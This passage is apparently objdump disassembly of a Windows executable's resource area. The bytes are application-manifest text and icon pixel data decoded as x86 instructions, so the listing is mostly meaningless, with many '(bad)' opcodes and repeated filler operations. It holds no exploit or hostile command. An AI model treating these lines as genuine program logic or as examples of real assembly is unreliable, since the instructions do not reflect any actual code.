  4047b7:	and    BYTE PTR [eax],ah
  4047b9:	and    BYTE PTR [ecx+eiz*2],bh
  4047bc:	jne    0x404832
  4047be:	outs   dx,DWORD PTR ds:[esi]
  4047bf:	inc    ebp
  4047c0:	ins    BYTE PTR es:[edi],dx
  4047c1:	gs jbe 0x404825
  4047c4:	je     0x40482b
  4047c6:	ds je  0x40483b
  4047c9:	jne    0x404830
  4047cb:	cmp    al,0x2f
  4047cd:	popa   
  4047ce:	jne    0x404844
  4047d0:	outs   dx,DWORD PTR ds:[esi]
  4047d1:	inc    ebp
  4047d2:	ins    BYTE PTR es:[edi],dx
  4047d3:	gs jbe 0x404837
  4047d6:	je     0x40483d
  4047d8:	ds or  eax,0x2020200a
  4047de:	cmp    al,0x2f
  4047e0:	popa   
  4047e1:	jae    0x404850
  4047e3:	jbe    0x404818
  4047e5:	cmp    dh,BYTE PTR [edi+0x69]
  4047e8:	outs   dx,BYTE PTR ds:[esi]
  4047e9:	outs   dx,DWORD PTR fs:[esi]
  4047eb:	ja     0x404860
  4047ed:	push   ebx
  4047ee:	gs je  0x404865
  4047f1:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  4047f8:	cmp    al,0x2f
  4047fa:	popa   
  4047fb:	jae    0x40486a
  4047fd:	jbe    0x404832
  4047ff:	cmp    ah,BYTE PTR [ecx+0x70]
  404802:	jo     0x404870
  404804:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40480b:	ds or  eax,0x612f3c0a
  404811:	jae    0x404886
  404813:	gs ins DWORD PTR es:[edi],dx
  404815:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404819:	or     eax,0xa
  40481e:	add    BYTE PTR [eax],al
  404820:	sub    BYTE PTR [eax],al
  404822:	add    BYTE PTR [eax],al
  404824:	xor    BYTE PTR [eax],al
  404826:	add    BYTE PTR [eax],al
  404828:	pusha  
  404829:	add    BYTE PTR [eax],al
  40482b:	add    BYTE PTR [ecx],al
  40482d:	add    BYTE PTR [eax+eax*1],al
  404830:	add    BYTE PTR [eax],al
  404832:	add    BYTE PTR [eax],al
  404834:	add    BYTE PTR [eax+eax*1],0x0
	...
  40484c:	add    BYTE PTR [eax],al
  40484e:	add    BYTE PTR [eax],0x0
  404851:	add    BYTE PTR [eax],0x0
  404854:	add    BYTE PTR [eax+0x800080],al
  40485a:	add    BYTE PTR [eax],al
  40485c:	add    BYTE PTR [eax],0x80
  40485f:	add    BYTE PTR [eax-0x7fffff80],al
  404865:	add    BYTE PTR [eax-0x3f3f4000],0x0
  40486c:	add    BYTE PTR [eax],al
  40486e:	inc    DWORD PTR [eax]
  404870:	add    bh,bh
  404872:	add    BYTE PTR [eax],al
  404874:	add    bh,bh
  404876:	inc    DWORD PTR [eax]
  404878:	inc    DWORD PTR [eax]
  40487a:	add    BYTE PTR [eax],al
  40487c:	inc    DWORD PTR [eax]
  40487e:	inc    DWORD PTR [eax]
  404880:	(bad)  
  404881:	inc    DWORD PTR [eax]
  404883:	add    bh,bh
  404885:	(bad)  
  404886:	inc    DWORD PTR [eax]
	...
  4048dc:	or     BYTE PTR [eax+0x8888],cl
	...
  4048f2:	add    BYTE PTR [eax-0x7070071],cl
  4048f8:	mov    BYTE PTR [eax+0x0],cl
	...
  40490a:	mov    al,bh
  40490c:	clc    
  40490d:	mov    BYTE PTR [eax-0x77770771],cl
	...
  40491f:	add    BYTE PTR [eax],al
  404921:	mov    BYTE PTR [eax-0x70000778],cl
  404927:	(bad)
  40492b:	jo     0x40492d
	...
  404935:	add    BYTE PTR [eax],al
  404937:	add    BYTE PTR [eax],cl
  404939:	mov    BYTE PTR [eax-0x7777008],cl
  40493f:	mov    BYTE PTR [eax+0x877888],cl
	...
  40494d:	add    BYTE PTR [eax],al
  40494f:	add    BYTE PTR [eax],cl
  404951:	mov    BYTE PTR [eax-0x77070778],cl
  404957:	vpmacssdql xmm0,xmm6,xmm0,XMMWORD PTR [edi+0x0]
  404961:	add    BYTE PTR [eax],al
  404963:	add    BYTE PTR [eax],al
  404965:	add    BYTE PTR [eax],al
  404967:	add    BYTE PTR [eax],cl
  404969:	mov    BYTE PTR [eax-0x77077778],cl
  40496f:	mov    BYTE PTR [eax+0x887777],cl
	...
  40497d:	add    BYTE PTR [eax],al
  40497f:	add    BYTE PTR [eax],cl
  404981:	mov    BYTE PTR [eax-0x7777778],cl
  404987:	mov    BYTE PTR [edi+0x878787],al
  40498d:	add    BYTE PTR [eax],al
  40498f:	add    BYTE PTR [eax],al
  404991:	pop    es
  404992:	ja     0x404994
  404994:	add    BYTE PTR [eax],al
  404996:	add    BYTE PTR [eax],al
  404998:	add    BYTE PTR [eax-0x77777778],cl
  40499e:	mov    BYTE PTR [eax+0x77],bh
  4049a1:	ja     0x404a1b
  4049a3:	js     0x4049ad
  4049a5:	add    BYTE PTR [eax],0x0
  4049a8:	add    BYTE PTR [eax+0x7f],bh
  4049ab:	xchg   DWORD PTR [ecx+0x77],esi
  4049ae:	jo     0x4049b0
  4049b0:	add    BYTE PTR [eax],cl
  4049b2:	js     0x40493c
  4049b4:	mov    BYTE PTR [edi+0x77077777],al
  4049ba:	mov    BYTE PTR [eax+0x8088],cl
  4049c0:	or     BYTE PTR [edi+0x77778878],al
  4049c6:	clc    
  4049c7:	jo     0x4049c9
  4049c9:	add    BYTE PTR [eax],cl
  4049cb:	ja     0x404954
  4049cd:	ja     0x404a46
  4049cf:	ja     0x404958
  4049d1:	mov    BYTE PTR [eax+0x808888],cl
  4049d7:	add    BYTE PTR [eax],cl
  4049d9:	mov    BYTE PTR [eax-0x78],bh
  4049dc:	mov    BYTE PTR [edi+0x77],dh
  4049df:	mov    BYTE PTR [eax+0x0],dh
  4049e2:	add    BYTE PTR [eax],al
  4049e4:	xchg   DWORD PTR [edi+0x77],esi
  4049e7:	js     0x404a61
  4049e9:	mov    BYTE PTR [eax+0x808888],cl
  4049ef:	add    BYTE PTR [eax],cl
  4049f1:	js     0x40497b
  4049f3:	mov    BYTE PTR [eax-0x7888871],cl
  4049f9:	jo     0x4049fb
  4049fb:	xchg   DWORD PTR [edi-0x79],esi
  4049fe:	xchg   DWORD PTR [eax+0x6c7c8888],ecx
  404a04:	mov    BYTE PTR [eax-0x77f80000],cl
  404a0a:	js     0x404993
  404a0c:	js     0x404996
  404a0e:	push   DWORD PTR [edi+0x77]
  404a11:	js     0x404a8b
  404a13:	js     0x40499c
  404a15:	mov    BYTE PTR [eax-0x79],bh
  404a18:	jl     0x404a66
  404a1a:	inc    esp
  404a1b:	les    ecx,FWORD PTR [eax+0x8000088]
  404a21:	mov    BYTE PTR [eax+0x77778787],cl
  404a27:	xchg   DWORD PTR [eax-0x78],edi
  404a2a:	mov    BYTE PTR [edi-0x3b9b8379],al
  404a30:	les    ebp,FWORD PTR [esp+ebp*2+0x64]
  404a34:	mov    BYTE PTR [edi-0x77f80000],al
  404a3a:	mov    BYTE PTR [edi+0x78877778],al
  404a40:	mov    BYTE PTR [edi+0x444c5677],al
  404a46:	inc    esp
  404a47:	dec    esp
  404a48:	ins    BYTE PTR es:[edi],dx
  404a49:	pop    esp
  404a4a:	jl     0x404aa8
  404a4c:	mov    BYTE PTR [eax-0x77f80000],cl
  404a52:	mov    BYTE PTR [eax-0x78778788],cl
  404a58:	jbe    0x404aae
  404a5a:	inc    esp
  404a5b:	inc    esp
  404a5c:	inc    esp
  404a5d:	inc    esp
  404a5e:	mov    edi,0xc6c6c647
  404a64:	jg     0x4049ed
  404a66:	add    BYTE PTR [eax],al
  404a68:	or     BYTE PTR [eax-0x78777878],cl
  404a6e:	inc    esi
  404a6f:	inc    esp
  404a70:	inc    esp
  404a71:	inc    esp
  404a72:	inc    esp
  404a73:	dec    esp
  404a74:	inc    esp
  404a75:	fs dec esp
  404a77:	ins    BYTE PTR es:[edi],dx
  404a78:	jl     0x404af6
  404a7a:	jl     0x404af8
  404a7c:	js     0x404a06
  404a7e:	add    BYTE PTR [eax],al
  404a80:	or     BYTE PTR [eax-0x78787878],cl
  404a86:	inc    esp
  404a87:	inc    esp
  404a88:	inc    esp
  404a89:	inc    esp
  404a8a:	dec    esp
  404a8b:	inc    esp
  404a8c:	push   0x7c7cc784
  404a91:	jl     0x404a1f
  404a93:	mov    WORD PTR [eax-0x78],?
  404a96:	add    BYTE PTR [eax],al
  404a98:	or     al,bh
  404a9a:	mov    BYTE PTR [eax+0x56448878],cl
  404aa0:	les    eax,FWORD PTR [esi+0x44]
  404aa3:	inc    esi
  404aa4:	mov    BYTE PTR [edi-0x737383b4],al
  404aaa:	out    0xc8,eax
  404aac:	iret   
  404aad:	xchg   DWORD PTR [eax],eax
  404aaf:	add    BYTE PTR [eax],cl
  404ab1:	mov    BYTE PTR [eax+0x46888887],cl
  404ab7:	les    esi,FWORD PTR [esp+ecx*2+0x44]
  404abb:	push   0xc8488888
  404ac0:	enter  0xc8e7,0x7c
  404ac4:	mov    al,bh
  404ac6:	add    BYTE PTR [eax],al
  404ac8:	or     BYTE PTR [eax-0x77777788],cl
  404ace:	push   esp
  404acf:	je     0x404b17
  404ad1:	push   esp
  404ad2:	inc    esi
  404ad3:	vpmacsswd xmm1,xmm6,xmm0,XMMWORD PTR [esp+r9d*4-0x37717379]
  404ade:	add    BYTE PTR [eax],0x8
  404ae1:	mov    BYTE PTR [eax+0x64888888],cl
  404ae7:	jl     0x404b65
  404ae9:	fs js  0x404aeb
  404aec:	pop    esp
  404aed:	jg     0x404ae6
  404aef:	js     0x404ad9
  404af1:	enter  0x7878,0x78
  404af5:	test   DWORD PTR [eax+0x78880800],0x74888888
  404aff:	jl     0x404b75
  404b01:	inc    esp
  404b02:	pop    DWORD PTR [edi-0x3707373c]
  404b08:	js     0x404a91
  404b0a:	ja     0x404b84
  404b0c:	enter  0x8088,0x0
  404b10:	or     BYTE PTR [eax-0x77777788],cl
  404b16:	jl     0x404b8c
  404b18:	jl     0x404b66
  404b1a:	ja     0x404ae0
  404b1c:	mov    BYTE PTR [edi-0x71],0x88
  404b20:	ja     0x404aa9
  404b22:	mov    cs,WORD PTR [eax+0x808888]
  404b28:	or     BYTE PTR [eax-0x78],bh
  404b2b:	mov    BYTE PTR [eax+0x767c8488],cl
  404b31:	inc    esp
  404b32:	les    ebp,FWORD PTR [esp+ecx*2-0x34]
  404b36:	(bad)  
  404b37:	test   DWORD PTR [edi-0x18787272],0x70f8
  404b41:	jp     0x404bbb
  404b43:	mov    BYTE PTR [eax-0x3a887b78],cl
  404b49:	inc    esp
  404b4a:	dec    esp
  404b4b:	dec    esp
  404b4c:	ins    BYTE PTR es:[edi],dx
  404b4d:	dec    esp
  404b4e:	js     0x404b48
  404b50:	js     0x404ada
  404b52:	mov    al,ch
  404b54:	mov    BYTE PTR [eax+0x33000080],cl
  404b5a:	js     0x404b54
  404b5c:	clc    
  404b5d:	clc    
  404b5e:	test   BYTE PTR [eax+0x6c],bh
  404b61:	dec    esp
  404b62:	ins    BYTE PTR es:[edi],dx
  404b63:	dec    esp
  404b64:	dec    esp
  404b65:	ins    BYTE PTR es:[edi],dx
  404b66:	mov    BYTE PTR [edi-0x77777779],cl
  404b6c:	xchg   DWORD PTR [eax+0x70000070],ecx
  404b72:	js     0x404afc
  404b74:	mov    BYTE PTR [edi+0x46c4c887],cl
  404b7a:	(bad)  
  404b7b:	(bad)  
  404b7c:	int3   
  404b7d:	into   
  404b7e:	mov    BYTE PTR [eax-0x77777709],cl
  404b84:	mov    BYTE PTR [edi+0x74000070],cl
  404b8a:	js     0x404b84
  404b8c:	(bad)
  404b90:	dec    esp
  404b91:	dec    esp
  404b92:	dec    esp
  404b93:	ins    BYTE PTR es:[edi],dx
  404b94:	mov    bh,0x88
  404b97:	mov    BYTE PTR [eax-0x77777788],cl
  404b9d:	mov    BYTE PTR [eax-0x77890000],cl
  404ba3:	(bad)  
  404ba4:	clc    
  404ba5:	pop    DWORD PTR [edi+0x6c4cc4c7]
  404bab:	(bad)  
  404bac:	int3   
  404bad:	enter  0x8888,0x88
  404bb1:	mov    BYTE PTR [eax+0x788f888f],cl
  404bb7:	add    BYTE PTR [eax],al
  404bb9:	js     0x88404bbe
  404bbf:	(bad)  
  404bc0:	dec    esp
  404bc1:	ins    BYTE PTR es:[edi],dx
  404bc2:	dec    esp
  404bc3:	dec    esp
  404bc4:	int3   
  404bc5:	enter  0xf8f8,0x88
  404bc9:	mov    BYTE PTR [eax-0x77700108],cl
  404bcf:	add    BYTE PTR [eax],al
  404bd1:	add    BYTE PTR [eax],al
  404bd3:	mov    BYTE PTR [eax-0x3bbb7701],cl
  404bd9:	dec    esp
  404bda:	ins    BYTE PTR es:[edi],dx
  404bdb:	mov    dh,0xcf
  404bde:	(bad)
  404be2:	mov    al,bh
  404be4:	clc    
  404be5:	pop    DWORD PTR [edi+0x0]
  404beb:	add    BYTE PTR [eax],cl
  404bed:	mov    BYTE PTR [eax+0x4c6c4c44],cl
  404bf3:	ins    BYTE PTR es:[edi],dx
  404bf4:	int3   
  404bf5:	mov    al,bh
  404bf7:	(bad)  
  404bf8:	clc    
  404bf9:	mov    al,bh
  404bfb:	(bad)  
  404bfc:	clc    
  404bfd:	(bad)
  404c01:	add    BYTE PTR [eax],al
  404c03:	add    BYTE PTR [eax],al
  404c05:	add    BYTE PTR [eax-0x333bbbb4],cl
  404c0b:	int3   
  404c0c:	ins    BYTE PTR es:[edi],dx
  404c0d:	(bad)  
  404c0e:	(bad)  
  404c0f:	(bad)  
  404c10:	(bad)  
  404c11:	dec    DWORD PTR [edi-0x78707778]
  404c17:	add    BYTE PTR [eax],al
  404c19:	add    BYTE PTR [eax],al
  404c1b:	add    BYTE PTR [eax],al
  404c1d:	add    BYTE PTR [eax],cl
  404c1f:	inc    esp
  404c20:	mov    dh,0xc6
  404c23:	(bad)  
  404c24:	int3   
  404c25:	(bad)  
  404c26:	clc    
  404c27:	clc    
  404c28:	mov    BYTE PTR [esi-0x10771778],cl
  404c2e:	mov    BYTE PTR [eax],al
  404c30:	add    BYTE PTR [eax],al
  404c32:	add    BYTE PTR [eax],al
  404c34:	add    BYTE PTR [eax],al
  404c36:	or     BYTE PTR [esp+eax*2-0x3c],ah
  404c3a:	int3   
  404c3b:	int3   
  404c3c:	int3   
  404c3d:	call   0x8928d4d0
  404c42:	mov    al,bh
  404c44:	clc    
  404c45:	inc    DWORD PTR [eax+0x0]
  404c4b:	add    BYTE PTR [eax],al
  404c4d:	add    BYTE PTR [eax],cl
  404c4f:	pop    esp
  404c50:	dec    esp
  404c51:	dec    esp
  404c52:	fs jbe 0x404bdc
  404c55:	mov    BYTE PTR [eax-0x70707078],cl
  404c5b:	add    BYTE PTR [eax],0x0
	...
  404c66:	or     BYTE PTR [esi+0x77],dh
  404c69:	mov    BYTE PTR [eax-0x70777071],cl
  404c6f:	add    BYTE PTR [eax],0x0
	...
  404c7e:	or     BYTE PTR [eax-0x7f707778],cl
	...
  404c94:	add    BYTE PTR [eax],al
  404c96:	add    al,dh
	...
  404d08:	(bad)  
  404d09:	(bad)  
  404d0a:	(bad)  
  404d0b:	(bad)  
  404d0c:	(bad)  
  404d0d:	inc    DWORD PTR [eax]
  404d0f:	add    bh,bh
  404d11:	(bad)  
  404d12:	(bad)  
  404d13:	(bad)  
  404d14:	(bad)  
  404d15:	inc    DWORD PTR [eax]
  404d17:	add    bh,bh
  404d19:	(bad)  
  404d1a:	(bad)  
  404d1b:	(bad)  
  404d1c:	(bad)  
  404d1d:	inc    DWORD PTR [eax]
  404d1f:	add    bh,bh
  404d21:	(bad)  
  404d22:	inc    DWORD PTR [eax+0xffff]
  404d28:	(bad)  
  404d29:	(bad)  
  404d2a:	cld    
  404d2b:	add    BYTE PTR [edi],cl
  404d2d:	inc    DWORD PTR [eax]
  404d2f:	add    bh,bh
  404d31:	push   eax
  404d33:	add    BYTE PTR [ebx],al
  404d35:	inc    DWORD PTR [eax]
  404d37:	add    bh,bh
  404d39:	inc    eax
  404d3b:	add    BYTE PTR [ecx],al
  404d3d:	inc    DWORD PTR [eax]
  404d3f:	add    bh,bh
  404d41:	inc    DWORD PTR [eax+0xff0000]
  404d47:	add    bh,bh
  404d49:	inc    DWORD PTR [eax+0xff0000]
  404d4f:	add    bh,bh
  404d51:	inc    DWORD PTR [eax+0xff0000]
  404d57:	add    bh,bh
  404d59:	inc    DWORD PTR [eax+0xff0000]
  404d5f:	add    bl,ah
  404d61:	inc    eax
  404d63:	add    BYTE PTR [eax],al
  404d65:	lahf   
  404d66:	add    BYTE PTR [eax],al
  404d68:	rol    BYTE PTR [edi],0xe0
  404d6b:	add    BYTE PTR [eax],al
  404d6d:	pop    ds
  404d6e:	add    BYTE PTR [eax],al
  404d70:	add    BYTE PTR [ecx],0xf8
  404d73:	add    BYTE PTR [eax],al
  404d75:	pop    ds
  404d76:	add    BYTE PTR [eax],al
  404d78:	add    BYTE PTR [eax],0x7f
  404d7b:	add    BYTE PTR [eax],al
  404d7d:	pop    ds
  404d7e:	add    BYTE PTR [eax],al
  404d80:	add    BYTE PTR [eax],0x1c
  404d83:	add    BYTE PTR [eax],al
  404d85:	sldt   WORD PTR [eax]
  404d88:	add    BYTE PTR [eax],0x0
  404d8b:	add    BYTE PTR [eax],al
  404d8d:	sldt   WORD PTR [eax]
  404d90:	add    BYTE PTR [eax],0x0
  404d93:	add    BYTE PTR [eax],al
  404d95:	sldt   WORD PTR [eax]
  404d98:	add    BYTE PTR [eax],0x0
  404d9b:	add    BYTE PTR [eax],al
  404d9d:	sldt   WORD PTR [eax]
  404da0:	add    BYTE PTR [eax],0x0
  404da3:	add    BYTE PTR [eax],al
  404da5:	sldt   WORD PTR [eax]
  404da8:	add    BYTE PTR [eax],0x0
  404dab:	add    BYTE PTR [eax],al
  404dad:	sldt   WORD PTR [eax]
  404db0:	add    BYTE PTR [eax],0x0
  404db3:	add    BYTE PTR [eax],al
  404db5:	sldt   WORD PTR [eax]
  404db8:	add    BYTE PTR [eax],0x0
  404dbb:	add    BYTE PTR [eax],al
  404dbd:	sldt   WORD PTR [eax]
  404dc0:	add    BYTE PTR [eax],0x0
  404dc3:	add    BYTE PTR [eax],al
  404dc5:	sldt   WORD PTR [eax]
  404dc8:	add    BYTE PTR [eax],0x0
  404dcb:	add    BYTE PTR [eax],al
  404dcd:	pop    es
  404dce:	add    BYTE PTR [eax],al
  404dd0:	add    BYTE PTR [eax],0x0
  404dd3:	add    BYTE PTR [eax],al
  404dd5:	pop    es
  404dd6:	add    BYTE PTR [eax],al
  404dd8:	add    BYTE PTR [eax],0x0
  404ddb:	add    BYTE PTR [eax],al
  404ddd:	pop    es
  404dde:	add    BYTE PTR [eax],al
  404de0:	add    BYTE PTR [eax],0x0
  404de3:	add    BYTE PTR [eax],al
  404de5:	pop    es
  404de6:	add    BYTE PTR [eax],al
  404de8:	add    BYTE PTR [eax],0x0
  404deb:	add    BYTE PTR [eax],al
  404ded:	pop    es
  404dee:	add    BYTE PTR [eax],al
  404df0:	rol    BYTE PTR [eax],0x0
  404df3:	add    BYTE PTR [eax],al
  404df5:	pop    es
  404df6:	add    BYTE PTR [eax],al
  404df8:	rol    BYTE PTR [eax],0x0
  404dfb:	add    BYTE PTR [eax],al
  404dfd:	pop    es
  404dfe:	add    BYTE PTR [eax],al
  404e00:	rol    BYTE PTR [eax],0x0
  404e03:	add    BYTE PTR [eax],al
  404e05:	pop    es
  404e06:	add    BYTE PTR [eax],al
  404e08:	rol    BYTE PTR [eax],0x0
  404e0b:	add    BYTE PTR [eax],al
  404e0d:	add    eax,DWORD PTR [eax]
  404e0f:	add    al,al
  404e11:	add    BYTE PTR [eax],al
  404e13:	add    BYTE PTR [eax],al
  404e15:	add    eax,DWORD PTR [eax]
  404e17:	add    al,ah
  404e19:	add    BYTE PTR [eax],al
  404e1b:	add    BYTE PTR [eax],al
  404e1d:	add    eax,DWORD PTR [eax]
  404e1f:	add    ah,bh
  404e21:	add    BYTE PTR [eax],al
  404e23:	add    BYTE PTR [eax],al
  404e25:	add    eax,DWORD PTR [eax]
  404e27:	add    bh,bh
  404e29:	add    BYTE PTR [eax],0x0
  404e2c:	add    BYTE PTR [ebx],al
  404e2e:	add    BYTE PTR [eax],al
  404e30:	push   eax
  404e32:	add    BYTE PTR [eax],al
  404e34:	add    BYTE PTR [ebx],al
  404e36:	add    BYTE PTR [eax],al
  404e38:	(bad)  
  404e39:	clc    
  404e3a:	add    BYTE PTR [eax],al
  404e3c:	add    BYTE PTR [ebx],al
  404e3e:	add    BYTE PTR [eax],al
  404e40:	(bad)  
  404e41:	clc    
  404e42:	add    BYTE PTR [eax],al
  404e44:	add    BYTE PTR [edi],al
  404e46:	add    BYTE PTR [eax],al
  404e48:	(bad)  
  404e49:	clc    
  404e4a:	add    BYTE PTR [eax],al
  404e4c:	add    edi,edi
  404e4e:	add    BYTE PTR [eax],al
  404e50:	(bad)  
  404e51:	clc    
  404e52:	add    BYTE PTR [ecx],al
  404e54:	(bad)  
  404e55:	inc    DWORD PTR [eax]
  404e57:	add    bh,bh
  404e59:	clc    
  404e5a:	add    edi,edi
  404e5c:	(bad)  
  404e5d:	inc    DWORD PTR [eax]
  404e5f:	add    bh,bh
  404e61:	std    
  404e62:	(bad)  
  404e63:	(bad)  
  404e64:	(bad)  
  404e65:	inc    DWORD PTR [eax]
  404e67:	add    bh,bh
  404e69:	(bad)  
  404e6a:	(bad)  
  404e6b:	(bad)  
  404e6c:	(bad)  
  404e6d:	inc    DWORD PTR [eax]
  404e6f:	add    bh,bh
  404e71:	(bad)  
  404e72:	(bad)  
  404e73:	(bad)  
  404e74:	(bad)  
  404e75:	inc    DWORD PTR [eax]
  404e77:	add    bh,bh
  404e79:	(bad)  
  404e7a:	(bad)  
  404e7b:	(bad)  
  404e7c:	(bad)  
  404e7d:	inc    DWORD PTR [eax]
  404e7f:	add    bh,bh
  404e81:	(bad)  
  404e82:	(bad)  
  404e83:	(bad)  
  404e84:	(bad)  
  404e85:	inc    DWORD PTR [eax]
  404e87:	add    BYTE PTR [eax],ch
  404e89:	add    BYTE PTR [eax],al
  404e8b:	add    BYTE PTR [eax],ah
  404e8d:	add    BYTE PTR [eax],al
  404e8f:	add    BYTE PTR [eax+0x0],al
  404e92:	add    BYTE PTR [eax],al
  404e94:	add    DWORD PTR [eax],eax
  404e96:	add    al,0x0
  404e98:	add    BYTE PTR [eax],al
  404e9a:	add    BYTE PTR [eax],al
  404e9c:	add    BYTE PTR [edx],al
	...
  404eb6:	add    BYTE PTR [eax],0x0
  404eb9:	add    BYTE PTR [eax],0x0
  404ebc:	add    BYTE PTR [eax+0x800080],al
  404ec2:	add    BYTE PTR [eax],al
  404ec4:	add    BYTE PTR [eax],0x80
  404ec7:	add    BYTE PTR [eax-0x7fffff80],al
  404ecd:	add    BYTE PTR [eax-0x3f3f4000],0x0
  404ed4:	add    BYTE PTR [eax],al
  404ed6:	inc    DWORD PTR [eax]
  404ed8:	add    bh,bh
  404eda:	add    BYTE PTR [eax],al
  404edc:	add    bh,bh
  404ede:	inc    DWORD PTR [eax]
  404ee0:	inc    DWORD PTR [eax]
  404ee2:	add    BYTE PTR [eax],al
  404ee4:	inc    DWORD PTR [eax]
  404ee6:	inc    DWORD PTR [eax]
  404ee8:	(bad)  
  404ee9:	inc    DWORD PTR [eax]
  404eeb:	add    bh,bh
  404eed:	(bad)  
  404eee:	inc    DWORD PTR [eax]
	...
  404f18:	or     BYTE PTR [edi+0x88],cl
	...
  404f26:	add    BYTE PTR [eax],cl
  404f28:	(bad)  
  404f29:	clc    
  404f2a:	(bad)
	...
  404f36:	or     BYTE PTR [edi-0x77707771],cl
  404f3c:	mov    BYTE PTR [eax],al
	...
  404f46:	mov    BYTE PTR [eax-0x77777071],cl
  404f4c:	mov    BYTE PTR [eax+0x0],al
  404f52:	add    BYTE PTR [eax],al
  404f54:	add    BYTE PTR [eax],al
  404f56:	mov    BYTE PTR [eax-0x77770708],cl
  404f5c:	xchg   DWORD PTR [eax+0x0],eax
  404f62:	add    BYTE PTR [eax],al
  404f64:	add    BYTE PTR [eax],al
  404f66:	mov    BYTE PTR [eax-0x78777778],cl
  404f6c:	ja     0x404eee
  404f6e:	add    BYTE PTR [eax],al
  404f70:	add    BYTE PTR [edi+0x70],dh
  404f73:	add    BYTE PTR [eax],al
  404f75:	add    BYTE PTR [eax],cl
  404f77:	mov    BYTE PTR [eax+0x78777788],cl
  404f7d:	mov    BYTE PTR [eax-0x877f900],al
  404f83:	ja     0x404ffd
  404f85:	add    BYTE PTR [eax],al
  404f87:	or     BYTE PTR [eax+0x77],bh
  404f8a:	ja     0x405003
  404f8c:	mov    BYTE PTR [edi-0x78f8ff78],cl
  404f92:	mov    BYTE PTR [edi+0x8777],al
  404f98:	xchg   DWORD PTR [edi+0x78],esi
  404f9b:	clc    
  404f9c:	clc    
  404f9d:	js     0x404f27
  404f9f:	add    BYTE PTR [eax],cl
  404fa1:	xchg   DWORD PTR [eax+0x7777f778],ecx
  404fa7:	mov    BYTE PTR [eax+0x447c8888],cl
  404fad:	(bad)  
  404fae:	mov    BYTE PTR [eax],al
  404fb0:	pop    es
  404fb1:	mov    BYTE PTR [eax+0x77],bh
  404fb4:	js     0x404f45
  404fb6:	clc    
  404fb7:	mov    BYTE PTR [edi+0x44],dh
  404fba:	inc    esp
  404fbb:	inc    esp
  404fbc:	mov    bh,0xf8
  404fbf:	add    BYTE PTR [eax],cl
  404fc1:	mov    BYTE PTR [edi+0x74878888],al
  404fc7:	inc    esp
  404fc8:	inc    esp
  404fc9:	dec    esp
  404fca:	ins    BYTE PTR es:[edi],dx
  404fcb:	mov    edi,0x70088c7
  404fd1:	mov    BYTE PTR [eax+0x78],bh
  404fd4:	je     0x40501a
  404fd6:	inc    esp
  404fd7:	inc    esp
  404fd8:	inc    esi
  404fd9:	dec    esp
  404fda:	ja     0x404fa3
  404fdc:	mov    edi,0x880800f7
  404fe2:	mov    BYTE PTR [eax+0x44],bh
  404fe5:	inc    esp
  404fe6:	inc    esp
  404fe7:	inc    esi
  404fe8:	mov    BYTE PTR [eax+ecx*8-0x38],al
  404fec:	enter  0x88ce,0x0
  404ff0:	pop    es
  404ff1:	test   DWORD PTR [eax+0x64657488],0x7c77f848
  404ffb:	mov    ?,WORD PTR [edi+0x77]
  404ffe:	clc    
  404fff:	add    BYTE PTR [eax],cl
  405001:	xchg   DWORD PTR [eax+0x47c77488],ecx
  405007:	(bad)  
  405008:	pop    eax
  405009:	xchg   DWORD PTR [eax-0x77833738],ecx
  40500f:	add    BYTE PTR [edi],al
  405011:	xchg   DWORD PTR [eax+0x787c8488],ecx
  405017:	test   ah,0xf8
  40501a:	enter  0x8888,0x88
  40501e:	mov    BYTE PTR [eax],al
  405020:	pop    es
  405021:	xchg   DWORD PTR [eax-0x39887b78],ecx
  405027:	push   esp
  405028:	les    edi,FWORD PTR [edi-0x79]
  40502b:	xchg   DWORD PTR [esi+0x780f88c],ecx
  405031:	mov    bh,0x88
  405033:	mov    BYTE PTR [esp+edi*2-0x37333bbc],al
  40503a:	test   DWORD PTR [eax-0x7f777778],0x888f2707
  405044:	hlt    
  405045:	test   BYTE PTR [esp+ecx*2+0x6c],cl
  405049:	push   0x8888688f
  40504e:	mov    BYTE PTR [eax-0x7077b8f9],al
  405054:	xchg   esp,eax
  405056:	mov    dh,0xcc
  405059:	iret   
  40505a:	mov    BYTE PTR [eax+0x70888888],cl
  405060:	or     BYTE PTR [eax-0x1],bh
  405063:	clc    
  405064:	xchg   DWORD PTR [esp+ebp*2+0x4c],eax
  405068:	int3   
  405069:	(bad)
  40506d:	clc    
  40506e:	pop    DWORD PTR [eax-0x77f800]
  405074:	xchg   DWORD PTR [esp+ecx*2-0x3a],ecx
  405078:	int3   
  405079:	(bad)
  40507d:	dec    DWORD PTR [eax+0x80]
  405083:	mov    BYTE PTR [edi-0x3333b9b4],al
  405089:	(bad)  
  40508a:	dec    DWORD PTR [eax-0x7f107771]
  405090:	add    BYTE PTR [eax],al
  405092:	add    BYTE PTR [eax],al
  405094:	mov    BYTE PTR [esp+ecx*8+0x4c],al
  405098:	(bad)  
  405099:	mov    BYTE PTR [eax-0x70777178],cl
  40509f:	add    BYTE PTR [eax],0x0
  4050a2:	add    BYTE PTR [eax],al
  4050a4:	or     BYTE PTR [esp+ecx*2+0x67],al
  4050a8:	enter  0x8888,0x88
  4050ac:	(bad)  
  4050ad:	(bad)  
  4050ae:	inc    DWORD PTR [eax]
  4050b0:	add    BYTE PTR [eax],al
  4050b2:	add    BYTE PTR [eax],al
  4050b4:	or     BYTE PTR [eax-0x78],bh
  4050b7:	(bad)  
  4050b8:	(bad)
	...
  4050c4:	or     al,bh
	...
  4050ee:	add    BYTE PTR [eax],al
  4050f0:	(bad)  
  4050f1:	(bad)  
  4050f2:	(bad)  
  4050f3:	(bad)  
  4050f4:	(bad)  
  4050f5:	(bad)  
  4050f6:	(bad)  
  4050f7:	(bad)  
  4050f8:	(bad)  
  4050f9:	inc    DWORD PTR [ebx+0xfeffff]
  4050ff:	(bad)  
  405100:	(bad)  
  405101:	clc    
  405102:	add    BYTE PTR [edi],bh
  405104:	push   eax
  405106:	add    BYTE PTR [edi],bl
  405108:	push   eax
  40510a:	add    BYTE PTR [edi],bl
  40510c:	push   eax
  40510e:	add    BYTE PTR [edi],bl
  405110:	xbegin 0x3ec05816
  405116:	add    BYTE PTR [ebx],al
  405118:	or     BYTE PTR [edi],0x0
  40511b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405121:	add    BYTE PTR [eax],al
  405123:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405129:	add    BYTE PTR [eax],al
  40512b:	add    eax,DWORD PTR [eax-0x7ffd0000]
